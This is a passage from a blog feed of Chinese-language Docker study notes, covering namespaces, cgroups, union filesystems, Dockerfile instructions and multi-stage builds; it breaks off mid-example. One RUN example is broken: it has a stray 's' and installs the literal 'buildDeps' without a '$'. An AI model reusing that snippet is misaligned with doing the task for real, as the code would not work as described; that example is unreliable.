每个命名空间中的 pid 能够相互隔离，但是网络端口还是共享 host 的端口。网络隔离是通过 net 命名空间实现的， 每个 net 命名空间有独立的 网络设备, IP 地址, 路由表, &#x2F;proc&#x2F;net 目录。这样每个容器的网络就能隔离开来。Docker 默认采用 veth 的方式，将容器中的虚拟网卡同 host 上的一 个Docker 网桥 docker0 连接在一起。</p><h3 id="2-3、ipc-命名空间"><a href="#2-3、ipc-命名空间" class="headerlink" title="2.3、ipc 命名空间"></a>2.3、ipc 命名空间</h3><p>容器中进程交互还是采用了 Linux 常见的进程间交互方法(interprocess communication - IPC), 包括信号量、消息队列和共享内存等。然而同 VM 不同的是，容器的进程间交互实际上还是 host 上具有相同 pid 命名空间中的进程间交互，因此需要在 IPC 资源申请时加入命名空间信息，每个 IPC 资源有一个唯一的 32 位 id。</p><h3 id="2-4、mnt-命名空间"><a href="#2-4、mnt-命名空间" class="headerlink" title="2.4、mnt 命名空间"></a>2.4、mnt 命名空间</h3><p>类似 chroot，将一个进程放到一个特定的目录执行。mnt 命名空间允许不同命名空间的进程看到的文件结构不同，这样每个命名空间 中的进程所看到的文件目录就被隔离开了。同 chroot 不同，每个命名空间中的容器在 &#x2F;proc&#x2F;mounts 的信息只包含所在命名空间的 mount point。</p><h3 id="2-5、uts-命名空间"><a href="#2-5、uts-命名空间" class="headerlink" title="2.5、uts 命名空间"></a>2.5、uts 命名空间</h3><p>UTS(“UNIX Time-sharing System”) 命名空间允许每个容器拥有独立的 hostname 和 domain name, 使其在网络上可以被视作一个独立的节点而非 主机上的一个进程。</p><h3 id="2-6、user-命名空间"><a href="#2-6、user-命名空间" class="headerlink" title="2.6、user 命名空间"></a>2.6、user 命名空间</h3><p>每个容器可以有不同的用户和组 id, 也就是说可以在容器内用容器内部的用户执行程序而非主机上的用户。</p><h2 id="三、控制组"><a href="#三、控制组" class="headerlink" title="三、控制组"></a>三、控制组</h2><p>控制组（<a href="http://en.wikipedia.org/wiki/Cgroups">cgroups</a>）是 Linux 内核的一个特性，主要用来对共享资源进行隔离、限制、审计等。只有能控制分配到容器的资源，才能避免当多个容器同时运行时的对系统资源的竞争。</p><p>控制组技术最早是由 Google 的程序员在 2006 年提出，Linux 内核自 2.6.24 开始支持。</p><p>控制组可以提供对容器的内存、CPU、磁盘 IO 等资源的限制和审计管理。</p><h2 id="四、联合文件系统"><a href="#四、联合文件系统" class="headerlink" title="四、联合文件系统"></a>四、联合文件系统</h2><p>联合文件系统（<a href="http://en.wikipedia.org/wiki/UnionFS">UnionFS</a>）是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。</p><p>联合文件系统是 Docker 镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</p><p>另外，不同 Docker 容器就可以共享一些基础的文件系统层，同时再加上自己独有的改动层，大大提高了存储的效率。</p><p>Docker 中使用的 AUFS（AnotherUnionFS）就是一种联合文件系统。 <code>AUFS</code> 支持为每一个成员目录（类似 Git 的分支）设定只读（readonly）、读写（readwrite）和写出（whiteout-able）权限, 同时 <code>AUFS</code> 里有一个类似分层的概念, 对只读权限的分支可以逻辑上进行增量地修改(不影响只读部分的)。</p><p>Docker 目前支持的联合文件系统包括 <code>OverlayFS</code>, <code>AUFS</code>, <code>Btrfs</code>, <code>VFS</code>, <code>ZFS</code> 和 <code>Device Mapper</code>。</p><p>各 Linux 发行版 Docker 推荐使用的存储驱动如下表。</p><table><thead><tr><th>Linux 发行版</th><th>Docker 推荐使用的存储驱动</th></tr></thead><tbody><tr><td>Docker CE on Ubuntu</td><td><code>aufs</code>, <code>devicemapper</code>, <code>overlay2</code> (Ubuntu 14.04.4 +, 16.04 +), <code>overlay</code>, <code>zfs</code>, <code>vfs</code></td></tr><tr><td>Docker CE on Debian</td><td><code>aufs</code>, <code>devicemapper</code>, <code>overlay2</code> (Debian Stretch), <code>overlay</code>, <code>vfs</code></td></tr><tr><td>Docker CE on CentOS</td><td><code>devicemapper</code>, <code>vfs</code></td></tr><tr><td>Docker CE on Fedora</td><td><code>devicemapper</code>, <code>overlay2</code> (Fedora 26 +), <code>overlay</code> (实验性支持), <code>vfs</code></td></tr></tbody></table><p>在可能的情况下，推荐使用 <code>overlay2</code> 存储驱动，<code>overlay2</code> 是目前 Docker 默认的存储驱动，以前则是 <code>aufs</code>。你可以通过配置来使用以上提到的其他类型的存储驱动。</p><h2 id="五、容器格式"><a href="#五、容器格式" class="headerlink" title="五、容器格式"></a>五、容器格式</h2><p>最初，Docker 采用了 <code>LXC</code> 中的容器格式。从 0.7 版本以后开始去除 LXC，转而使用自行开发的 <a href="https://github.com/docker/libcontainer">libcontainer</a>，从 1.11 开始，则进一步演进为使用 <a href="https://github.com/opencontainers/runc">runC</a> 和 <a href="https://containerd.tools/">containerd</a>。</p><p>对更多容器格式的支持，还在进一步的发展中。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
            <tag> Docker </tag>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker镜像制作-Docker学习笔记</title>
      <link href="/2017/10/10/docker-2/"/>
      <url>/2017/10/10/docker-2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p> Dockerfile是一种被Docker程序解释的脚本，由一条一条指令组成，本质是一组指令的集合。Dockerfile有自己的命令格式，Docker程序会读取Dockerfile，并将这些指令翻译成Linux命令，根据命令制成相应的镜像文件，使用户清晰的了解镜像的制作过程；镜像的定制实际上就是定制每一层所添加的配置、文件，如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，那么无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。</p><h2 id="二、Dockerfile指令"><a href="#二、Dockerfile指令" class="headerlink" title="二、Dockerfile指令"></a>二、Dockerfile指令</h2><h3 id="2-1、FROM-指定基础镜像"><a href="#2-1、FROM-指定基础镜像" class="headerlink" title="2.1、FROM 指定基础镜像"></a>2.1、FROM 指定基础镜像</h3><p>所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。而 <code>FROM</code> 就是指定<strong>基础镜像</strong>，因此一个 <code>Dockerfile</code> 中 <code>FROM</code> 是必备的指令，并且必须是第一条指令。</p><p>除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 <code>scratch</code>。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。如果你以 <code>scratch</code> 为基础镜像的话，意味着你不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。</p><p>不以任何系统为基础，直接将可执行文件复制进镜像的做法并不罕见，比如 <a href="https://hub.docker.com/_/swarm/"><code>swarm</code></a>、<a href="https://quay.io/repository/coreos/etcd"><code>coreos/etcd</code></a>。对于 Linux 下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接 <code>FROM scratch</code> 会让镜像体积更加小巧。使用 <a href="https://golang.org/">Go 语言</a> 开发的应用很多会使用这种方式来制作镜像，这也是为什么有人认为 Go 是特别适合容器微服务架构的语言的原因之一。</p><h3 id="2-2、RUN-执行命令"><a href="#2-2、RUN-执行命令" class="headerlink" title="2.2、RUN 执行命令"></a>2.2、RUN 执行命令</h3><p><code>RUN</code> 指令是用来执行命令行命令的。由于命令行的强大能力，<code>RUN</code> 指令在定制镜像时是最常用的指令之一。其格式有两种：</p><ul><li><code>shell格式</code>：<code>RUN &lt;命令&gt;</code>，就像直接在命令行中输入的命令一样。刚才写的 Dockerfile 中的 <code>RUN</code> 指令就是这种格式；</li><li><code>exec格式</code>：<code>RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</code>，这更像是函数调用中的格式;</li></ul><p>Dockerfile 中每一个指令都会建立一层，<code>RUN</code> 也不例外。每一个 <code>RUN</code> 的行为，都会新建立一层，在其上执行这些命令，执行结束后，<code>commit</code> 这一层的修改，构成新的镜像，所以建议多个指令使用一个<code>RUN</code>命令执行；</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> debian:jessie</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> buildDeps=<span class="string">&#x27;gcc libc6-dev make&#x27;</span> s\</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y buildDeps</span></span><br></pre></td></tr></table></figure><h3 id="2-3、COPY-复制文件"><a href="#2-3、COPY-复制文件" class="headerlink" title="2.3、COPY 复制文件"></a>2.3、COPY 复制文件</h3><ul><li><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径&gt;... &lt;目标路径&gt;</code></li><li><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]</code></li></ul><p>和 <code>RUN</code> 指令一样，也有两种格式，一种类似于命令行，一种类似于函数调用。<code>COPY</code> 指令将从构建上下文目录中 <code>&lt;源路径&gt;</code> 的文件&#x2F;目录复制到新的一层的镜像内的 <code>&lt;目标路径&gt;</code> 位置。</p><p><code>&lt;源路径&gt;</code> 可以是多个，甚至可以是通配符，其通配符规则要满足 Go 的 <a href="https://golang.org/pkg/path/filepath/#Match"><code>filepath.Match</code></a> 规则；</p><p><code>&lt;目标路径&gt;</code> 可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工作目录可以用 <code>WORKDIR</code>指令来指定）。目标路径不需要事先创建，如果目录不存在会在复制文件前先行创建缺失目录。</p><p>使用 <code>COPY</code> 指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。</p><h3 id="2-4、ADD-更高级的复制文件"><a href="#2-4、ADD-更高级的复制文件" class="headerlink" title="2.4、ADD 更高级的复制文件"></a>2.4、ADD 更高级的复制文件</h3><p><code>ADD</code> 指令和 <code>COPY</code> 的格式和性质基本一致。但是在 <code>COPY</code> 基础上增加了一些功能。比如 <code>&lt;源路径&gt;</code> 可以是一个 <code>URL</code>，这种情况下，Docker 引擎会试图去下载这个链接的文件放到 <code>&lt;目标路径&gt;</code> 去。下载后的文件权限自动设置为 <code>600</code>，如果 <code>&lt;源路径&gt;</code> 为一个 <code>tar</code> 压缩文件的话，压缩格式为 <code>gzip</code>, <code>bzip2</code> 以及 <code>xz</code> 的情况下，<code>ADD</code> 指令将会自动解压缩这个压缩文件到 <code>&lt;目标路径&gt;</code> 去。</p><p>在 Docker 官方的 <a href="https://yeasy.gitbooks.io/docker_practice/appendix/best_practices.html">Dockerfile 最佳实践文档</a> 中要求，尽可能的使用 <code>COPY</code>，因为 <code>COPY</code> 的语义很明确，就是复制文件而已，而 <code>ADD</code> 则包含了更复杂的功能，其行为也不一定很清晰。最适合使用 <code>ADD</code> 的场合，就是所提及的需要自动解压缩的场合。</p><p><code>ADD</code> 指令会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢，因此在 <code>COPY</code> 和 <code>ADD</code> 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 <code>COPY</code> 指令，仅在需要自动解压缩的场合使用 <code>ADD</code>。</p><p>在使用该指令的时候还可以加上 <code>--chown=&lt;user&gt;:&lt;group&gt;</code> 选项来改变文件的所属用户及所属组。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD</span><span class="language-bash"> --<span class="built_in">chown</span>=55:mygroup files* /mydir/</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> --<span class="built_in">chown</span>=bin files* /mydir/</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> --<span class="built_in">chown</span>=1 files* /mydir/</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> --<span class="built_in">chown</span>=10:11 files* /mydir/</span></span><br></pre></td></tr></table></figure><h3 id="2-5、CMD-容器启动命令"><a href="#2-5、CMD-容器启动命令" class="headerlink" title="2.5、CMD 容器启动命令"></a>2.5、CMD 容器启动命令</h3><p><code>CMD</code> 指令就是用于指定默认的容器主进程的启动命令的，<code>CMD</code> 指令的格式和 <code>RUN</code> 相似，也是两种格式：</p><ul><li><code>shell</code> 格式：<code>CMD &lt;命令&gt;</code></li><li><code>exec</code> 格式：<code>CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;...]</code></li></ul><p>在指令格式上，一般推荐使用 <code>exec</code> 格式，这类格式在解析时会被解析为 JSON 数组，因此一定要使用双引号 <code>&quot;</code>，而不要使用单引号。</p><p>Docker 不是虚拟机，容器中的应用都应该以前台执行，而不是像虚拟机、物理机里面那样，用 upstart&#x2F;systemd 去启动后台服务，容器内没有后台服务的概念。对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。</p><p>使用 <code>service nginx start</code> 命令，是希望 upstart 来以后台守护进程形式启动 <code>nginx</code> 服务。而刚才说了 <code>CMD service nginx start</code> 会被理解为 <code>CMD [ &quot;sh&quot;, &quot;-c&quot;, &quot;service nginx start&quot;]</code>，因此主进程实际上是 <code>sh</code>。那么当 <code>service nginx start</code> 命令结束后，<code>sh</code> 也就结束了，<code>sh</code> 作为主进程退出了，自然就会令容器退出。</p><p>正确的做法是直接执行 <code>nginx</code> 可执行文件，并且要求以前台形式运行。比如：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;nginx&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;daemon off;&quot;</span>]</span></span><br></pre></td></tr></table></figure><h3 id="2-6、ENTRYPOINT-入口点"><a href="#2-6、ENTRYPOINT-入口点" class="headerlink" title="2.6、ENTRYPOINT 入口点"></a>2.6、ENTRYPOINT 入口点</h3><p><code>ENTRYPOINT</code> 的格式和 <code>RUN</code> 指令格式一样，分为 <code>exec</code> 格式和 <code>shell</code> 格式。<code>ENTRYPOINT</code> 的目的和 <code>CMD</code> 一样，都是在指定容器启动程序及参数。<code>ENTRYPOINT</code> 在运行时也可以替代，不过比 <code>CMD</code> 要略显繁琐，需要通过 <code>docker run</code> 的参数 <code>--entrypoint</code> 来指定。</p><p>当指定了 <code>ENTRYPOINT</code> 后，<code>CMD</code> 的含义就发生了改变，不再是直接的运行其命令，而是将 <code>CMD</code> 的内容作为参数传给 <code>ENTRYPOINT</code> 指令，换句话说实际执行时，将变为：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">ENTRYPOINT</span><span class="language-bash">&gt; <span class="string">&quot;&lt;CMD&gt;&quot;</span></span></span><br></pre></td></tr></table></figure><h3 id="2-7、ENV-设置环境变量"><a href="#2-7、ENV-设置环境变量" class="headerlink" title="2.7、ENV 设置环境变量"></a>2.7、ENV 设置环境变量</h3><p>两种格式：</p><ul><li><code>ENV &lt;key&gt; &lt;value&gt;</code></li><li><code>ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</code></li></ul><p>这个指令很简单，就是设置环境变量而已，无论是后面的其它指令，如 <code>RUN</code>，还是运行时的应用，都可以直接使用这里定义的环境变量。</p><p>下列指令可以支持环境变量展开： <code>ADD</code>、<code>COPY</code>、<code>ENV</code>、<code>EXPOSE</code>、<code>LABEL</code>、<code>USER</code>、<code>WORKDIR</code>、<code>VOLUME</code>、<code>STOPSIGNAL</code>、<code>ONBUILD</code></p><h3 id="2-8、ARG-构建参数"><a href="#2-8、ARG-构建参数" class="headerlink" title="2.8、ARG 构建参数"></a>2.8、ARG 构建参数</h3><p>格式：<code>ARG &lt;参数名&gt;[=&lt;默认值&gt;]</code></p><p>构建参数和 <code>ENV</code> 的效果一样，都是设置环境变量。所不同的是，<code>ARG</code> 所设置的是构建环境的环境变量，在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用 <code>ARG</code> 保存密码之类的信息，因为 <code>docker history</code> 还是可以看到所有值的。</p><p><code>Dockerfile</code> 中的 <code>ARG</code> 指令是定义参数名称，以及定义其默认值。该默认值可以在构建命令 <code>docker build</code> 中用 <code>--build-arg &lt;参数名&gt;=&lt;值&gt;</code> 来覆盖。</p><p>在 1.13 之前的版本，要求 <code>--build-arg</code> 中的参数名，必须在 <code>Dockerfile</code> 中用 <code>ARG</code> 定义过了，换句话说，就是 <code>--build-arg</code> 指定的参数，必须在 <code>Dockerfile</code> 中使用了。如果对应参数没有被使用，则会报错退出构建。从 1.13 开始，这种严格的限制被放开，不再报错退出，而是显示警告信息，并继续构建。这对于使用 CI 系统，用同样的构建流程构建不同的 <code>Dockerfile</code> 的时候比较有帮助，避免构建命令必须根据每个 Dockerfile 的内容修改。</p><h3 id="2-9、VOLUME-定义匿名卷"><a href="#2-9、VOLUME-定义匿名卷" class="headerlink" title="2.9、VOLUME 定义匿名卷"></a>2.9、VOLUME 定义匿名卷</h3><p>格式为：</p><ul><li><code>VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]</code></li><li><code>VOLUME &lt;路径&gt;</code></li></ul><p>之前我们说过，容器运行时应该尽量保持容器存储层不发生写操作，对于数据库类需要保存动态数据的应用，其数据库文件应该保存于卷(volume)中，后面的章节我们会进一步介绍 Docker 卷的概念。为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 <code>Dockerfile</code> 中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。这里的 <code>/data</code> 目录就会在运行时自动挂载为匿名卷，任何向 <code>/data</code> 中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> /data</span></span><br></pre></td></tr></table></figure><h3 id="2-10、EXPOSE-声明端口"><a href="#2-10、EXPOSE-声明端口" class="headerlink" title="2.10、EXPOSE 声明端口"></a>2.10、EXPOSE 声明端口</h3><p>格式为 <code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code>。</p><p><code>EXPOSE</code> 指令是声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。在 Dockerfile 中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是 <code>docker run -P</code>时，会自动随机映射 <code>EXPOSE</code> 的端口。</p><p>要将 <code>EXPOSE</code> 和在运行时使用 <code>-p &lt;宿主端口&gt;:&lt;容器端口&gt;</code> 区分开来。<code>-p</code>，是映射宿主端口和容器端口，换句话说，就是将容器的对应端口服务公开给外界访问，而 <code>EXPOSE</code> 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射。</p><h3 id="2-11、WORKDIR-指定工作目录"><a href="#2-11、WORKDIR-指定工作目录" class="headerlink" title="2.11、WORKDIR 指定工作目录"></a>2.11、WORKDIR 指定工作目录</h3><p>格式为 <code>WORKDIR &lt;工作目录路径&gt;</code></p><p>使用 <code>WORKDIR</code> 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，<code>WORKDIR</code> 会帮你建立目录。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; world.txt</span></span><br></pre></td></tr></table></figure><p>如果将上面的 <code>Dockerfile</code> 进行构建镜像运行后，会发现找不到 <code>/app/world.txt</code> 文件，或者其内容不是 <code>hello</code>。原因其实很简单，在 Shell 中，连续两行是同一个进程执行环境，因此前一个命令修改的内存状态，会直接影响后一个命令；而在 <code>Dockerfile</code> 中，这两行 <code>RUN</code> 命令的执行环境根本不同，是两个完全不同的容器。这就是对 <code>Dockerfile</code> 构建分层存储的概念不了解所导致的错误。</p><p>之前说过每一个 <code>RUN</code> 都是启动一个容器、执行命令、然后提交存储层文件变更。第一层 <code>RUN cd /app</code> 的执行仅仅是当前进程的工作目录变更，一个内存上的变化而已，其结果不会造成任何文件变更。而到第二层的时候，启动的是一个全新的容器，跟第一层的容器更完全没关系，自然不可能继承前一层构建过程中的内存变化。</p><p>因此如果需要改变以后各层的工作目录的位置，那么应该使用 <code>WORKDIR</code> 指令。</p><h3 id="2-12、USER-指定当前用户"><a href="#2-12、USER-指定当前用户" class="headerlink" title="2.12、USER 指定当前用户"></a>2.12、USER 指定当前用户</h3><p>格式：<code>USER &lt;用户名&gt;[:&lt;用户组&gt;]</code></p><p><code>USER</code> 指令和 <code>WORKDIR</code> 相似，都是改变环境状态并影响以后的层。<code>WORKDIR</code> 是改变工作目录，<code>USER</code>则是改变之后层的执行 <code>RUN</code>, <code>CMD</code> 以及 <code>ENTRYPOINT</code> 这类命令的身份。</p><p>当然，和 <code>WORKDIR</code> 一样，<code>USER</code> 只是帮助你切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换。</p><p>如果以 <code>root</code> 执行的脚本，在执行期间希望改变身份，比如希望以某个已经建立好的用户来运行某个服务进程，不要使用 <code>su</code> 或者 <code>sudo</code>，这些都需要比较麻烦的配置，而且在 TTY 缺失的环境下经常出错。建议使用 <a href="https://github.com/tianon/gosu"><code>gosu</code></a>。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 建立 redis 用户，并使用 gosu 换另一个用户执行命令</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r redis &amp;&amp; useradd -r -g redis redis</span></span><br><span class="line"><span class="comment"># 下载 gosu</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget -O /usr/local/bin/gosu <span class="string">&quot;https://github.com/tianon/gosu/releases/download/1.7/gosu-amd64&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> +x /usr/local/bin/gosu \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; gosu nobody <span class="literal">true</span></span></span><br><span class="line"><span class="comment"># 设置 CMD，并以另外的用户执行</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;gosu&quot;</span>, <span class="string">&quot;redis&quot;</span>, <span class="string">&quot;redis-server&quot;</span> ]</span></span><br></pre></td></tr></table></figure><h3 id="2-13、HEALTHCHECK-健康检查"><a href="#2-13、HEALTHCHECK-健康检查" class="headerlink" title="2.13、HEALTHCHECK 健康检查"></a>2.13、HEALTHCHECK 健康检查</h3><p>格式：</p><ul><li><code>HEALTHCHECK [选项] CMD &lt;命令&gt;</code>：设置检查容器健康状况的命令</li><li><code>HEALTHCHECK NONE</code>：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</li></ul><p><code>HEALTHCHECK</code> 指令是告诉 Docker 应该如何进行判断容器的状态是否正常，这是 Docker 1.12 引入的新指令。在没有 <code>HEALTHCHECK</code> 指令前，Docker 引擎只可以通过容器内主进程是否退出来判断容器是否状态异常。很多情况下这没问题，但是如果程序进入死锁状态，或者死循环状态，应用进程并不退出，但是该容器已经无法提供服务了。在 1.12 以前，Docker 不会检测到容器的这种状态，从而不会重新调度，导致可能会有部分容器已经无法提供服务了却还在接受用户请求。而自 1.12 之后，Docker 提供了 <code>HEALTHCHECK</code> 指令，通过该指令指定一行命令，用这行命令来判断容器主进程的服务状态是否还正常，从而比较真实的反应容器实际状态。当在一个镜像指定了 <code>HEALTHCHECK</code> 指令后，用其启动容器，初始状态会为 <code>starting</code>，在 <code>HEALTHCHECK</code> 指令检查成功后变为 <code>healthy</code>，如果连续一定次数失败，则会变为 <code>unhealthy</code>。</p><p><code>HEALTHCHECK</code> 支持下列选项：</p><ul><li><code>--interval=&lt;间隔&gt;</code>：两次健康检查的间隔，默认为 30 秒；</li><li><code>--timeout=&lt;时长&gt;</code>：健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认 30 秒；</li><li><code>--retries=&lt;次数&gt;</code>：当连续失败指定次数后，则将容器状态视为 <code>unhealthy</code>，默认 3 次。</li></ul><p>和 <code>CMD</code>, <code>ENTRYPOINT</code> 一样，<code>HEALTHCHECK</code> 只可以出现一次，如果写了多个，只有最后一个生效。在 <code>HEALTHCHECK [选项] CMD</code> 后面的命令，格式和 <code>ENTRYPOINT</code> 一样，分为 <code>shell</code> 格式，和 <code>exec</code> 格式。命令的返回值决定了该次健康检查的成功与否：<code>0</code>：成功；<code>1</code>：失败；<code>2</code>：保留，不要使用这个值。</p><p>当运行该镜像后，可以通过 <code>docker container ls</code> 看到容器的状态。</p><h3 id="2-14、ONBUILD-为他人做嫁衣裳"><a href="#2-14、ONBUILD-为他人做嫁衣裳" class="headerlink" title="2.14、ONBUILD 为他人做嫁衣裳"></a>2.14、ONBUILD 为他人做嫁衣裳</h3><p>格式：<code>ONBUILD &lt;其它指令&gt;</code>。</p><p><code>ONBUILD</code> 是一个特殊的指令，它后面跟的是其它指令，比如 <code>RUN</code>, <code>COPY</code> 等，而这些指令，在当前镜像构建时并不会被执行。只有当以当前镜像为基础镜像，去构建下一级镜像的时候才会被执行。</p><p><code>Dockerfile</code> 中的其它指令都是为了定制当前镜像而准备的，唯有 <code>ONBUILD</code> 是为了帮助别人定制自己而准备的。</p><h2 id="三、其他构建镜像的方式"><a href="#三、其他构建镜像的方式" class="headerlink" title="三、其他构建镜像的方式"></a>三、其他构建镜像的方式</h2><h3 id="3-1、多阶段构建"><a href="#3-1、多阶段构建" class="headerlink" title="3.1、多阶段构建"></a>3.1、多阶段构建</h3><p>在 Docker 17.05 版本之前，我们构建 Docker 镜像时，通常会采用两种方式：</p><ul><li><p>全部放入一个 Dockerfile进行构建；</p></li><li><p>分散到多个 Dockerfile进行构建；</p></li></ul><blockquote><p>全部放入一个 Dockerfile</p></blockquote><p>这种方式中，一个 <code>Dockerfile</code> 中将会包括项目及其依赖库的编译、测试、打包等流程，这里可能会带来的一些问题：</p><ul><li><code>Dockerfile</code> 特别长，可维护性降低</li><li>镜像层次多，镜像体积较大，部署时间变长</li><li>源代码存在泄露的风险</li></ul><blockquote><p>分散到多个 Dockerfile</p></blockquote><p>另一种方式，就是我们事先在一个 <code>Dockerfile</code> 将项目及其依赖库编译测试打包好后，再将其拷贝到运行环境中，这种方式需要我们编写两个 <code>Dockerfile</code> 和一些编译脚本才能将其两个阶段自动整合起来，这种方式虽然可以很好地规避第一种方式存在的风险，但明显部署过程较复杂。</p><h4 id="3-1-1、使用多阶段构建"><a href="#3-1-1、使用多阶段构建" class="headerlink" title="3.1.1、使用多阶段构建:"></a>3.1.1、使用多阶段构建:</h4><p>为解决以上问题，Docker v17.05 开始支持多阶段构建 (<code>multistage builds</code>)。使用多阶段构建我们就可以很容易解决前面提到的问题，并且只需要编写一个 <code>Dockerfile</code>：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.9</span>-alpine as builder</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk --no-cache add git</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /go/src/github.com/go/helloworld/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go get -d -v github.com/go-sql-driver/mysql</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app.go .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> alpine:latest as prod</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk --no-cache add ca-certificates</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=0 /go/src/github.com/go/helloworld/app .</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;./app&quot;</span>]</span></span><br></pre></td></tr></table></figure><ul><li><p>多阶段命名：可以使用 <code>as</code> 来为某一阶段命名，例如：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.9</span>-alpine as builder</span><br></pre></td></tr></table></figure></li><li><p>构建时从其他镜像复制文件：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-2、从-rootfs-压缩包导入构建"><a href="#3-2、从-rootfs-压缩包导入构建" class="headerlink" title="3.2、从 rootfs 压缩包导入构建"></a>3.2、从 rootfs 压缩包导入构建</h3><p>除了标准的使用 <code>Dockerfile</code> 生成镜像的方法外，由于各种特殊需求和历史原因，还提供了一些其它方法用以生成镜像。</p><p>格式：<code>docker import [选项] &lt;文件&gt;|&lt;URL&gt;|- [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></p><p>压缩包可以是本地文件、远程 Web 文件，甚至是从标准输入中得到。压缩包将会在镜像 <code>/</code> 目录展开，并直接作为镜像第一层提交。</p><p>比如我们想要创建一个 <a href="https://openvz.org/Main_Page">OpenVZ</a> 的 Ubuntu 14.04 <a href="https://openvz.org/Download/template/precreated">模板</a>的镜像：</p><figure 